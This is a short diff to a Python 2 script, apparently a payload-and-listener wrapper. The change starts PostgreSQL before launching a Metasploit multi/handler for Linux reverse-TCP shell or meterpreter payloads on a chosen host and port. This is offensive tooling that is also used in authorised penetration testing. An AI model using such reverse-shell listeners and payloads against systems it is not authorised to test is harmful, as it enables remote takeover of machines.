@@ -74,8 +74,10 @@ listen = raw_input("Do you want to start listener? (y/n): ")
 if option != '3' and option != '4':
     if listen.upper() == "Y":
         if option == '1':
+	    system('service postgresql start')
             system('msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/' + arch + '/shell/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y"')
 	elif option == '2':
+	    system('service postgresql start')
             system('msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/' + arch + '/meterpreter/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y"')
     else:
         print "Bye :D"
